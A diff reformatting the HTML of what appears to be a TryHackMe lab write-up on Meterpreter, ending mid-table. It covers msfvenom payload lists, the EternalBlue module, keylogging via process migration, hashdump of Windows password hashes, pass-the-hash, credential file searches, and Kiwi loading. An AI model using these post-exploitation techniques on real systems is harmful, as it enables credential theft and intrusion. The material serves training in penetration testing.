+</span></span></code></pre></div></li></ul><p>Techniques and tools that can be used to detect Meterpreter are beyond the scope of this room. This section aimed to show you how stealthy Meterpreter is running; remember, most antivirus software will detect it.</p><p>It is also worth noting that Meterpreter will establish an encrypted (TLS) communication channel with the attacker&rsquo;s system.</p><hr>
 <script async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script>
-<p><ins class=adsbygoogle style=display:block;text-align:center data-ad-layout=in-article data-ad-format=fluid data-ad-client=ca-pub-3526678290068011 data-ad-slot=7160066188></ins></p>
-<script>(adsbygoogle=window.adsbygoogle||[]).push({})</script>
+<p><ins class=adsbygoogle style=display:block;text-align:center data-ad-layout=in-article data-ad-format=fluid data-ad-client=ca-pub-3526678290068011 data-ad-slot=7160066188></ins></p><script>(adsbygoogle=window.adsbygoogle||[]).push({})</script>
 <hr>
-<h2 id=task-02-meterpreter-flavors>Task 02: Meterpreter Flavors</h2>
-<p>As you will remember, staged payloads are sent to the target in two steps. An initial part is installed (the stager) and requests the rest of the payload. This allows for a smaller initial payload size. The inline payloads are sent in a single step. Meterpreter payloads are also divided into stagged and inline versions. However, Meterpreter has a wide range of different versions you can choose from based on your target system.</p>
-<p>We have used the <code>msfvenom --list</code> payloads command and grepped &ldquo;meterpreter&rdquo; payloads (adding | grep meterpreter to the command line), so the output only shows these. You can try this command on the AttackBox.</p>
-<ul>
+<h2 id=task-02-meterpreter-flavors>Task 02: Meterpreter Flavors</h2><p>As you will remember, staged payloads are sent to the target in two steps. An initial part is installed (the stager) and requests the rest of the payload. This allows for a smaller initial payload size. The inline payloads are sent in a single step. Meterpreter payloads are also divided into stagged and inline versions. However, Meterpreter has a wide range of different versions you can choose from based on your target system.</p><p>We have used the <code>msfvenom --list</code> payloads command and grepped &ldquo;meterpreter&rdquo; payloads (adding | grep meterpreter to the command line), so the output only shows these. You can try this command on the AttackBox.</p><ul>
 <li>
-<p>code</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@ip-10-10-186-44:~# msfvenom --list payloads | grep meterpreter
-android/meterpreter/reverse_http                    Run a meterpreter server in Android. Tunnel communication over HTTP
-android/meterpreter/reverse_https                   Run a meterpreter server in Android. Tunnel communication over HTTPS
-android/meterpreter/reverse_tcp                     Run a meterpreter server in Android. Connect back stager
-android/meterpreter_reverse_http                    Connect back to attacker and spawn a Meterpreter shell
-android/meterpreter_reverse_https                   Connect back to attacker and spawn a Meterpreter shell
-android/meterpreter_reverse_tcp                     Connect back to the attacker and spawn a Meterpreter shell
-apple_ios/aarch64/meterpreter_reverse_http          Run the Meterpreter / Mettle server payload <span style=color:#f92672>(</span>stageless<span style=color:#f92672>)</span>
-apple_ios/aarch64/meterpreter_reverse_https         Run the Meterpreter / Mettle server payload <span style=color:#f92672>(</span>stageless<span style=color:#f92672>)</span>
-apple_ios/aarch64/meterpreter_reverse_tcp           Run the Meterpreter / Mettle server payload <span style=color:#f92672>(</span>stageless<span style=color:#f92672>)</span>
-apple_ios/armle/meterpreter_reverse_http            Run the Meterpreter / Mettle server payload <span style=color:#f92672>(</span>stageless<span style=color:#f92672>)</span>
-apple_ios/armle/meterpreter_reverse_https           Run the Meterpreter / Mettle server payload <span style=color:#f92672>(</span>stageless<span style=color:#f92672>)</span>
-apple_ios/armle/meterpreter_reverse_tcp             Run the Meterpreter / Mettle server payload <span style=color:#f92672>(</span>stageless<span style=color:#f92672>)</span>
-java/meterpreter/bind_tcp                           Run a meterpreter server in Java. Listen <span style=color:#66d9ef>for</span> a connection
-java/meterpreter/reverse_http                       Run a meterpreter server in Java. Tunnel communication over HTTP
-java/meterpreter/reverse_https                      Run a meterpreter server in Java. Tunnel communication over HTTPS
-java/meterpreter/reverse_tcp                        Run a meterpreter server in Java. Connect back stager
-linux/aarch64/meterpreter/reverse_tcp               Inject the mettle server payload <span style=color:#f92672>(</span>staged<span style=color:#f92672>)</span>. Connect back to the attacker
-linux/aarch64/meterpreter_reverse_http              Run the Meterpreter / Mettle server payload <span style=color:#f92672>(</span>stageless<span style=color:#f92672>)</span>
-linux/aarch64/meterpreter_reverse_https             Run the Meterpreter / Mettle server payload <span style=color:#f92672>(</span>stageless<span style=color:#f92672>)</span>
-linux/aarch64/meterpreter_reverse_tcp               Run the Meterpreter / Mettle server payload <span style=color:#f92672>(</span>stageless<span style=color:#f92672>)</span>
-linux/armbe/meterpreter_reverse_http                Run the Meterpreter / Mettle server payload <span style=color:#f92672>(</span>stageless<span style=color:#f92672>)</span>
-linux/armbe/meterpreter_reverse_https               Run the Meterpreter / Mettle server payload <span style=color:#f92672>(</span>stageless<span style=color:#f92672>)</span>
-linux/armbe/meterpreter_reverse_tcp                 Run the Meterpreter / Mettle server payload <span style=color:#f92672>(</span>stageless<span style=color:#f92672>)</span>
-linux/armle/meterpreter/bind_tcp                    Inject the mettle server payload <span style=color:#f92672>(</span>staged<span style=color:#f92672>)</span>. Listen <span style=color:#66d9ef>for</span> a connection
-linux/armle/meterpreter/reverse_tcp                 Inject the mettle server payload <span style=color:#f92672>(</span>staged<span style=color:#f92672>)</span>. Connect back to the attacker <span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
-</code></pre></div></li>
-</ul>
-<p>The list will show Meterpreter versions available for the following platforms;</p>
-<ul>
-<li>Android</li>
-<li>Apple iOS</li>
-<li>Java</li>
-<li>Linux</li>
-<li>OSX</li>
-<li>PHP</li>
-<li>Python</li>
-<li>Windows</li>
-</ul>
-<p>Your decision on which version of Meterpreter to use will be mostly based on three factors:</p>
-<ul>
-<li>The target operating system (Is the target operating system Linux or Windows? Is it a Mac device? Is it an Android phone? etc.)</li>
-<li>Components available on the target system (Is Python installed? Is this a PHP website? etc.)</li>
-<li>Network connection types you can have with the target system (Do they allow raw TCP connections? Can you only have an HTTPS reverse connection? Are IPv6 addresses not as closely monitored as IPv4 addresses? etc.)</li>
-</ul>
-<p>If you are not using Meterpreter as a standalone payload generated by Msfvenom, your choice may also be limited by the exploit. You will notice some exploits will have a default Meterpreter payload, as you can see in the example below with the ms17_010_eternalblue exploit.</p>
-<ul>
+<p>code</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ip-10-10-186-44:~# msfvenom --list payloads | grep meterpreter
+</span></span><span style=display:flex><span>android/meterpreter/reverse_http                    Run a meterpreter server in Android. Tunnel communication over HTTP
+</span></span><span style=display:flex><span>android/meterpreter/reverse_https                   Run a meterpreter server in Android. Tunnel communication over HTTPS
+</span></span><span style=display:flex><span>android/meterpreter/reverse_tcp                     Run a meterpreter server in Android. Connect back stager
+</span></span><span style=display:flex><span>android/meterpreter_reverse_http                    Connect back to attacker and spawn a Meterpreter shell
+</span></span><span style=display:flex><span>android/meterpreter_reverse_https                   Connect back to attacker and spawn a Meterpreter shell
+</span></span><span style=display:flex><span>android/meterpreter_reverse_tcp                     Connect back to the attacker and spawn a Meterpreter shell
+</span></span><span style=display:flex><span>apple_ios/aarch64/meterpreter_reverse_http          Run the Meterpreter / Mettle server payload <span style=color:#f92672>(</span>stageless<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>apple_ios/aarch64/meterpreter_reverse_https         Run the Meterpreter / Mettle server payload <span style=color:#f92672>(</span>stageless<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>apple_ios/aarch64/meterpreter_reverse_tcp           Run the Meterpreter / Mettle server payload <span style=color:#f92672>(</span>stageless<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>apple_ios/armle/meterpreter_reverse_http            Run the Meterpreter / Mettle server payload <span style=color:#f92672>(</span>stageless<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>apple_ios/armle/meterpreter_reverse_https           Run the Meterpreter / Mettle server payload <span style=color:#f92672>(</span>stageless<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>apple_ios/armle/meterpreter_reverse_tcp             Run the Meterpreter / Mettle server payload <span style=color:#f92672>(</span>stageless<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>java/meterpreter/bind_tcp                           Run a meterpreter server in Java. Listen <span style=color:#66d9ef>for</span> a connection
+</span></span><span style=display:flex><span>java/meterpreter/reverse_http                       Run a meterpreter server in Java. Tunnel communication over HTTP
+</span></span><span style=display:flex><span>java/meterpreter/reverse_https                      Run a meterpreter server in Java. Tunnel communication over HTTPS
+</span></span><span style=display:flex><span>java/meterpreter/reverse_tcp                        Run a meterpreter server in Java. Connect back stager
+</span></span><span style=display:flex><span>linux/aarch64/meterpreter/reverse_tcp               Inject the mettle server payload <span style=color:#f92672>(</span>staged<span style=color:#f92672>)</span>. Connect back to the attacker
+</span></span><span style=display:flex><span>linux/aarch64/meterpreter_reverse_http              Run the Meterpreter / Mettle server payload <span style=color:#f92672>(</span>stageless<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>linux/aarch64/meterpreter_reverse_https             Run the Meterpreter / Mettle server payload <span style=color:#f92672>(</span>stageless<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>linux/aarch64/meterpreter_reverse_tcp               Run the Meterpreter / Mettle server payload <span style=color:#f92672>(</span>stageless<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>linux/armbe/meterpreter_reverse_http                Run the Meterpreter / Mettle server payload <span style=color:#f92672>(</span>stageless<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>linux/armbe/meterpreter_reverse_https               Run the Meterpreter / Mettle server payload <span style=color:#f92672>(</span>stageless<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>linux/armbe/meterpreter_reverse_tcp                 Run the Meterpreter / Mettle server payload <span style=color:#f92672>(</span>stageless<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>linux/armle/meterpreter/bind_tcp                    Inject the mettle server payload <span style=color:#f92672>(</span>staged<span style=color:#f92672>)</span>. Listen <span style=color:#66d9ef>for</span> a connection
+</span></span><span style=display:flex><span>linux/armle/meterpreter/reverse_tcp                 Inject the mettle server payload <span style=color:#f92672>(</span>staged<span style=color:#f92672>)</span>. Connect back to the attacker <span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
+</span></span></code></pre></div></li></ul><p>The list will show Meterpreter versions available for the following platforms;</p><ul>
+<li>Android</li><li>Apple iOS</li><li>Java</li><li>Linux</li><li>OSX</li><li>PHP</li><li>Python</li><li>Windows</li></ul><p>Your decision on which version of Meterpreter to use will be mostly based on three factors:</p><ul>
+<li>The target operating system (Is the target operating system Linux or Windows? Is it a Mac device? Is it an Android phone? etc.)</li><li>Components available on the target system (Is Python installed? Is this a PHP website? etc.)</li><li>Network connection types you can have with the target system (Do they allow raw TCP connections? Can you only have an HTTPS reverse connection? Are IPv6 addresses not as closely monitored as IPv4 addresses? etc.)</li></ul><p>If you are not using Meterpreter as a standalone payload generated by Msfvenom, your choice may also be limited by the exploit. You will notice some exploits will have a default Meterpreter payload, as you can see in the example below with the ms17_010_eternalblue exploit.</p><ul>
 <li>
-<p>exploit</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue 
-<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Using configured payload windows/x64/meterpreter/reverse_tcp
-msf6 exploit<span style=color:#f92672>(</span>windows/smb/ms17_010_eternalblue<span style=color:#f92672>)</span> &gt;
-</code></pre></div></li>
-</ul>
-<p>You can also list other available payloads using the <code>show payloads</code> command with any module.</p>
-<ul>
+<p>exploit</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue 
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Using configured payload windows/x64/meterpreter/reverse_tcp
+</span></span><span style=display:flex><span>msf6 exploit<span style=color:#f92672>(</span>windows/smb/ms17_010_eternalblue<span style=color:#f92672>)</span> &gt;
+</span></span></code></pre></div></li></ul><p>You can also list other available payloads using the <code>show payloads</code> command with any module.</p><ul>
 <li>
-<p>payloads</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>msf6 exploit<span style=color:#f92672>(</span>windows/smb/ms17_010_eternalblue<span style=color:#f92672>)</span> &gt; show payloads 
-
-Compatible Payloads
-<span style=color:#f92672>===================</span>
-
-<span style=color:#75715e>#   Name                                        Disclosure Date  Rank    Check  Description</span>
--   ----                                        ---------------  ----    -----  -----------
-<span style=color:#ae81ff>0</span>   generic/custom                                               manual  No     Custom Payload
-<span style=color:#ae81ff>1</span>   generic/shell_bind_tcp                                       manual  No     Generic Command Shell, Bind TCP Inline
-<span style=color:#ae81ff>2</span>   generic/shell_reverse_tcp                                    manual  No     Generic Command Shell, Reverse TCP Inline
-<span style=color:#ae81ff>3</span>   windows/x64/exec                                             manual  No     Windows x64 Execute Command
-<span style=color:#ae81ff>4</span>   windows/x64/loadlibrary                                      manual  No     Windows x64 LoadLibrary Path
-<span style=color:#ae81ff>5</span>   windows/x64/messagebox                                       manual  No     Windows MessageBox x64
-<span style=color:#ae81ff>6</span>   windows/x64/meterpreter/bind_ipv6_tcp                        manual  No     Windows Meterpreter <span style=color:#f92672>(</span>Reflective Injection x64<span style=color:#f92672>)</span>, Windows x64 IPv6 Bind TCP Stager
-<span style=color:#ae81ff>7</span>   windows/x64/meterpreter/bind_ipv6_tcp_uuid                   manual  No     Windows Meterpreter <span style=color:#f92672>(</span>Reflective Injection x64<span style=color:#f92672>)</span>, Windows x64 IPv6 Bind TCP Stager with UUID Support
-<span style=color:#ae81ff>8</span>   windows/x64/meterpreter/bind_named_pipe                      manual  No     Windows Meterpreter <span style=color:#f92672>(</span>Reflective Injection x64<span style=color:#f92672>)</span>, Windows x64 Bind Named Pipe Stager <span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
-</code></pre></div></li>
-</ul>
-<hr>
-<h2 id=task-03--meterpreter-commands>Task 03: Meterpreter Commands</h2>
-<p>Typing <code>help</code> on any Meterpreter session (shown by meterpreter> at the prompt) will list all available commands.</p>
-<ul>
+<p>payloads</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf6 exploit<span style=color:#f92672>(</span>windows/smb/ms17_010_eternalblue<span style=color:#f92672>)</span> &gt; show payloads 
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Compatible Payloads
+</span></span><span style=display:flex><span><span style=color:#f92672>===================</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#   Name                                        Disclosure Date  Rank    Check  Description</span>
+</span></span><span style=display:flex><span>-   ----                                        ---------------  ----    -----  -----------
+</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span>   generic/custom                                               manual  No     Custom Payload
+</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span>   generic/shell_bind_tcp                                       manual  No     Generic Command Shell, Bind TCP Inline
+</span></span><span style=display:flex><span><span style=color:#ae81ff>2</span>   generic/shell_reverse_tcp                                    manual  No     Generic Command Shell, Reverse TCP Inline
+</span></span><span style=display:flex><span><span style=color:#ae81ff>3</span>   windows/x64/exec                                             manual  No     Windows x64 Execute Command
+</span></span><span style=display:flex><span><span style=color:#ae81ff>4</span>   windows/x64/loadlibrary                                      manual  No     Windows x64 LoadLibrary Path
+</span></span><span style=display:flex><span><span style=color:#ae81ff>5</span>   windows/x64/messagebox                                       manual  No     Windows MessageBox x64
+</span></span><span style=display:flex><span><span style=color:#ae81ff>6</span>   windows/x64/meterpreter/bind_ipv6_tcp                        manual  No     Windows Meterpreter <span style=color:#f92672>(</span>Reflective Injection x64<span style=color:#f92672>)</span>, Windows x64 IPv6 Bind TCP Stager
+</span></span><span style=display:flex><span><span style=color:#ae81ff>7</span>   windows/x64/meterpreter/bind_ipv6_tcp_uuid                   manual  No     Windows Meterpreter <span style=color:#f92672>(</span>Reflective Injection x64<span style=color:#f92672>)</span>, Windows x64 IPv6 Bind TCP Stager with UUID Support
+</span></span><span style=display:flex><span><span style=color:#ae81ff>8</span>   windows/x64/meterpreter/bind_named_pipe                      manual  No     Windows Meterpreter <span style=color:#f92672>(</span>Reflective Injection x64<span style=color:#f92672>)</span>, Windows x64 Bind Named Pipe Stager <span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
+</span></span></code></pre></div></li></ul><hr>
+<h2 id=task-03--meterpreter-commands>Task 03: Meterpreter Commands</h2><p>Typing <code>help</code> on any Meterpreter session (shown by meterpreter> at the prompt) will list all available commands.</p><ul>
 <li>
-<p>help</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>meterpreter &gt; help
-
-Core Commands
-<span style=color:#f92672>=============</span>
-
-Command                   Description
--------                   -----------
-?                         Help menu
-background                Backgrounds the current session
-bg                        Alias <span style=color:#66d9ef>for</span> background
-bgkill                    Kills a background meterpreter script
-bglist                    Lists running background scripts
-bgrun                     Executes a meterpreter script as a background thread
-channel                   Displays information or control active channels
-close                     Closes a channel<span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
-</code></pre></div></li>
-</ul>
-<p>Every version of Meterpreter will have different command options, so running the help command is always a good idea. Commands are built-in tools available on Meterpreter. They will run on the target system without loading any additional script or executable files.</p>
-<p>Meterpreter will provide you with three primary categories of tools;</p>
-<ul>
-<li>Built-in commands</li>
-<li>Meterpreter tools</li>
-<li>Meterpreter scripting</li>
-</ul>
-<p>If you run the help command, you will see Meterpreter commands are listed under different categories.</p>
-<ul>
-<li>Core commands</li>
-<li>File system commands</li>
-<li>Networking commands</li>
-<li>System commands</li>
-<li>User interface commands</li>
-<li>Webcam commands</li>
-<li>Audio output commands</li>
-<li>Elevate commands</li>
-<li>Password database commands</li>
-<li>Timestomp commands</li>
-</ul>
-<p>Please note that the list above was taken from the output of the help command on the Windows version of Meterpreter (windows/x64/meterpreter/reverse_tcp). These will be different for other Meterpreter versions.</p>
-<p><strong>Meterpreter commands</strong></p>
-<p>Core commands will be helpful to navigate and interact with the target system. Below are some of the most commonly used. Remember to check all available commands running the help command once a Meterpreter session has started.</p>
-<p><img src=https://i.imgur.com/i6PE07E.png alt=img></p>
-<p><img src=https://i.imgur.com/4UXBvSa.png alt=img></p>
-<p><img src=https://i.imgur.com/OI9ZyWU.png alt=img></p>
-<p><img src=https://i.imgur.com/d4R3Msa.png alt=img></p>
-<p><img src=https://i.imgur.com/PMCCw4Q.png alt=img></p>
-<p>Although all these commands may seem available under the help menu, they may not all work. For example, the target system might not have a webcam, or it can be running on a virtual machine without a proper desktop environment.</p>
-<hr>
-<h2 id=task-04post-exploitation-with-meterpreter>Task 04:Post-Exploitation with Meterpreter</h2>
-<p>Meterpreter provides you with many useful commands that facilitate the post-exploitation phase. Below are a few examples you will often use.</p>
-<p><strong>Help</strong></p>
-<p>This command will give you a list of all available commands in Meterpreter. As we have seen earlier, Meterpreter has many versions, and each version may have different options available. Typing help once you have a Meterpreter session will help you quickly browse through available commands.</p>
-<p><img src=https://i.imgur.com/xgwYFkq.png alt=img></p>
-<p><strong>Meterpreter commands</strong></p>
-<p>The <code>getuid</code> command will display the user with which Meterpreter is currently running. This will give you an idea of your possible privilege level on the target system (e.g. Are you an admin level user like NT AUTHORITY\SYSTEM or a regular user?)</p>
-<p><img src=https://i.imgur.com/Nf8tlhg.png alt=img></p>
-<p>The <code>ps</code> command will list running processes. The PID column will also give you the PID information you will need to migrate Meterpreter to another process.</p>
-<p><img src=https://i.imgur.com/jkkHTqY.png alt=img></p>
-<p><strong>Migrate</strong></p>
-<p>Migrating to another process will help Meterpreter interact with it. For example, if you see a word processor running on the target (e.g. word.exe, notepad.exe, etc.), you can migrate to it and start capturing keystrokes sent by the user to this process. Some Meterpreter versions will offer you the keyscan_start, keyscan_stop, and keyscan_dump command options to make Meterpreter act like a keylogger. Migrating to another process may also help you to have a more stable Meterpreter session.</p>
-<p>To migrate to any process, you need to type the migrate command followed by the PID of the desired target process. The example below shows Meterpreter migrating to process ID 716.</p>
-<p><img src=https://i.imgur.com/HCbgCa0.png alt=img></p>
-<p>Be careful; you may lose your user privileges if you migrate from a higher privileged (e.g. SYSTEM) user to a process started by a lower privileged user (e.g. webserver). You may not be able to gain them back.</p>
-<p><strong>Hashdump</strong></p>
-<p>The hashdump command will list the content of the SAM database. The SAM (Security Account Manager) database stores user&rsquo;s passwords on Windows systems. These passwords are stored in the NTLM (New Technology LAN Manager) format.</p>
-<p><img src=https://i.imgur.com/gd6z17M.png alt=img></p>
-<p>While it is not mathematically possible to &ldquo;crack&rdquo; these hashes, you may still discover the cleartext password using online NTLM databases or a rainbow table attack. These hashes can also be used in Pass-the-Hash attacks to authenticate to other systems that these users can access the same network.</p>
-<p><strong>Search</strong></p>
-<p>The search command is useful to locate files with potentially juicy information. In a CTF context, this can be used to quickly find a flag or proof file, while in actual penetration testing engagements, you may need to search for user-generated files or configuration files that may contain password or account information.</p>
-<p><img src=https://i.imgur.com/khrkqrL.png alt=img></p>
-<p><strong>Shell</strong></p>
-<p>The shell command will launch a regular command-line shell on the target system. Pressing CTRL+Z will help you go back to the Meterpreter shell.</p>
-<p><img src=https://i.imgur.com/aqVpbNJ.png alt=img></p>
-<hr>
-<h2 id=task-05-post-exploitation-challenge>Task 05: Post-Exploitation Challenge</h2>
-<p>Meterpreter provides several important post-exploitation tools.</p>
-<p>Commands mentioned previously, such as getsystem and hashdump will provide important leverage and information for privilege escalation and lateral movement. Meterpreter is also a good base you can use to run post-exploitation modules available on the Metasploit framework. Finally, you can also use the load command to leverage additional tools such as Kiwi or even the whole Python language.</p>
-<p><img src=https://i.imgur.com/DIg3D5y.png alt=img></p>
-<p>The post-exploitation phase will have several goals; Meterpreter has functions that can assist all of them.</p>
-<ul>
-<li>Gathering further information about the target system.</li>
-<li>Looking for interesting files, user credentials, additional network interfaces, and generally interesting information on the target system.</li>
-<li>Privilege escalation.</li>
-<li>Lateral movement.</li>
-</ul>
-<p>Once any additional tool is loaded using the load command, you will see new options on the help menu. The example below shows commands added for the Kiwi module (using the load kiwi command).</p>
-<p><img src=https://i.imgur.com/ZY1kcrj.png alt=img></p>
-<p>These will change according to the loaded menu, so running the help command after loading a module is always a good idea.</p>
-<p><img src=https://i.imgur.com/tzVhPqy.png alt=img></p>
-<h3 id=answer-the-questions-below>Answer the questions below</h3>
-<table>
+<p>help</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>meterpreter &gt; help
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Core Commands
+</span></span><span style=display:flex><span><span style=color:#f92672>=============</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Command                   Description
+</span></span><span style=display:flex><span>-------                   -----------
+</span></span><span style=display:flex><span>?                         Help menu
+</span></span><span style=display:flex><span>background                Backgrounds the current session
+</span></span><span style=display:flex><span>bg                        Alias <span style=color:#66d9ef>for</span> background
+</span></span><span style=display:flex><span>bgkill                    Kills a background meterpreter script
+</span></span><span style=display:flex><span>bglist                    Lists running background scripts
+</span></span><span style=display:flex><span>bgrun                     Executes a meterpreter script as a background thread
+</span></span><span style=display:flex><span>channel                   Displays information or control active channels
+</span></span><span style=display:flex><span>close                     Closes a channel<span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
+</span></span></code></pre></div></li></ul><p>Every version of Meterpreter will have different command options, so running the help command is always a good idea. Commands are built-in tools available on Meterpreter. They will run on the target system without loading any additional script or executable files.</p><p>Meterpreter will provide you with three primary categories of tools;</p><ul>
+<li>Built-in commands</li><li>Meterpreter tools</li><li>Meterpreter scripting</li></ul><p>If you run the help command, you will see Meterpreter commands are listed under different categories.</p><ul>
+<li>Core commands</li><li>File system commands</li><li>Networking commands</li><li>System commands</li><li>User interface commands</li><li>Webcam commands</li><li>Audio output commands</li><li>Elevate commands</li><li>Password database commands</li><li>Timestomp commands</li></ul><p>Please note that the list above was taken from the output of the help command on the Windows version of Meterpreter (windows/x64/meterpreter/reverse_tcp). These will be different for other Meterpreter versions.</p><p><strong>Meterpreter commands</strong></p><p>Core commands will be helpful to navigate and interact with the target system. Below are some of the most commonly used. Remember to check all available commands running the help command once a Meterpreter session has started.</p><p><img src=https://i.imgur.com/i6PE07E.png alt=img></p><p><img src=https://i.imgur.com/4UXBvSa.png alt=img></p><p><img src=https://i.imgur.com/OI9ZyWU.png alt=img></p><p><img src=https://i.imgur.com/d4R3Msa.png alt=img></p><p><img src=https://i.imgur.com/PMCCw4Q.png alt=img></p><p>Although all these commands may seem available under the help menu, they may not all work. For example, the target system might not have a webcam, or it can be running on a virtual machine without a proper desktop environment.</p><hr>
+<h2 id=task-04post-exploitation-with-meterpreter>Task 04:Post-Exploitation with Meterpreter</h2><p>Meterpreter provides you with many useful commands that facilitate the post-exploitation phase. Below are a few examples you will often use.</p><p><strong>Help</strong></p><p>This command will give you a list of all available commands in Meterpreter. As we have seen earlier, Meterpreter has many versions, and each version may have different options available. Typing help once you have a Meterpreter session will help you quickly browse through available commands.</p><p><img src=https://i.imgur.com/xgwYFkq.png alt=img></p><p><strong>Meterpreter commands</strong></p><p>The <code>getuid</code> command will display the user with which Meterpreter is currently running. This will give you an idea of your possible privilege level on the target system (e.g. Are you an admin level user like NT AUTHORITY\SYSTEM or a regular user?)</p><p><img src=https://i.imgur.com/Nf8tlhg.png alt=img></p><p>The <code>ps</code> command will list running processes. The PID column will also give you the PID information you will need to migrate Meterpreter to another process.</p><p><img src=https://i.imgur.com/jkkHTqY.png alt=img></p><p><strong>Migrate</strong></p><p>Migrating to another process will help Meterpreter interact with it. For example, if you see a word processor running on the target (e.g. word.exe, notepad.exe, etc.), you can migrate to it and start capturing keystrokes sent by the user to this process. Some Meterpreter versions will offer you the keyscan_start, keyscan_stop, and keyscan_dump command options to make Meterpreter act like a keylogger. Migrating to another process may also help you to have a more stable Meterpreter session.</p><p>To migrate to any process, you need to type the migrate command followed by the PID of the desired target process. The example below shows Meterpreter migrating to process ID 716.</p><p><img src=https://i.imgur.com/HCbgCa0.png alt=img></p><p>Be careful; you may lose your user privileges if you migrate from a higher privileged (e.g. SYSTEM) user to a process started by a lower privileged user (e.g. webserver). You may not be able to gain them back.</p><p><strong>Hashdump</strong></p><p>The hashdump command will list the content of the SAM database. The SAM (Security Account Manager) database stores user&rsquo;s passwords on Windows systems. These passwords are stored in the NTLM (New Technology LAN Manager) format.</p><p><img src=https://i.imgur.com/gd6z17M.png alt=img></p><p>While it is not mathematically possible to &ldquo;crack&rdquo; these hashes, you may still discover the cleartext password using online NTLM databases or a rainbow table attack. These hashes can also be used in Pass-the-Hash attacks to authenticate to other systems that these users can access the same network.</p><p><strong>Search</strong></p><p>The search command is useful to locate files with potentially juicy information. In a CTF context, this can be used to quickly find a flag or proof file, while in actual penetration testing engagements, you may need to search for user-generated files or configuration files that may contain password or account information.</p><p><img src=https://i.imgur.com/khrkqrL.png alt=img></p><p><strong>Shell</strong></p><p>The shell command will launch a regular command-line shell on the target system. Pressing CTRL+Z will help you go back to the Meterpreter shell.</p><p><img src=https://i.imgur.com/aqVpbNJ.png alt=img></p><hr>
+<h2 id=task-05-post-exploitation-challenge>Task 05: Post-Exploitation Challenge</h2><p>Meterpreter provides several important post-exploitation tools.</p><p>Commands mentioned previously, such as getsystem and hashdump will provide important leverage and information for privilege escalation and lateral movement. Meterpreter is also a good base you can use to run post-exploitation modules available on the Metasploit framework. Finally, you can also use the load command to leverage additional tools such as Kiwi or even the whole Python language.</p><p><img src=https://i.imgur.com/DIg3D5y.png alt=img></p><p>The post-exploitation phase will have several goals; Meterpreter has functions that can assist all of them.</p><ul>
+<li>Gathering further information about the target system.</li><li>Looking for interesting files, user credentials, additional network interfaces, and generally interesting information on the target system.</li><li>Privilege escalation.</li><li>Lateral movement.</li></ul><p>Once any additional tool is loaded using the load command, you will see new options on the help menu. The example below shows commands added for the Kiwi module (using the load kiwi command).</p><p><img src=https://i.imgur.com/ZY1kcrj.png alt=img></p><p>These will change according to the loaded menu, so running the help command after loading a module is always a good idea.</p><p><img src=https://i.imgur.com/tzVhPqy.png alt=img></p><h3 id=answer-the-questions-below>Answer the questions below</h3><table>
 <thead>
 <tr>
-<th>question</th>
-<th>ans</th>
-</tr>
-</thead>
-<tbody>
+<th>question</th><th>ans</th></tr></thead><tbody>
 <tr>
-<td>What is the computer name?</td>
-<td><a href=#1-sysinfo>5.1</a></td>
-</tr>
-<tr>
-<td>What is the target domain?</td>
-<td><a href=#1-sysinfo>5.1</a></td>
-</tr>
-<tr>
-<td>What is the name of the share likely created by the user?</td>
-<td><a href=#3>5.3</a></td>
-</tr>
-<tr>
-<td>What is the NTLM hash of the jchambers user?</td>
-<td><a href=#4>5.4</a></td>
-</tr>
-<tr>
-<td>What is the cleartext password of the jchambers user?</td>
-<td><a href=#5>5.5</a></td>
-</tr>
-<tr>
-<td>Where is the &ldquo;secrets.txt&rdquo; file located?</td>
-<td><a href=#6>5.6</a></td>
-</tr>
-<tr>
